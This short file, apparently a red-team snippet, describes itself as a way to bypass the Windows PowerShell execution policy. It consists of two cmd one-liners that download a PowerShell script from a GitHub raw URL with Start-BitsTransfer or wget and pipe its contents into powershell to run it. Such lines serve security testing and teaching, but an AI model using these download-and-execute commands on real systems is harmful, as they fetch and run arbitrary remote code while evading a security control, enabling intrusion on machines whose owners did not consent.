##Just another way to bypass the windows default script execution policy (resticted)
##URL: https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-6
##Desc: Downloads powershellscript and then executes.

cmd /c "powershell -c "Start-BitsTransfer "https://raw.githubusercontent.com/Tu5k4rr/TerminalBlue/master/Success.ps1" "C:\tmp\success.ps1"&& powershell -c Get-Content -Path "c:\tmp\success.ps1" | powershell -"

cmd.exe /c "powershell -c wget https://raw.githubusercontent.com/Tu5k4rr/TerminalBlue/master/Success.ps1 -Outfile success.ps1&& powershell -c Get-Content -Path .\success.ps1 | powershell -"
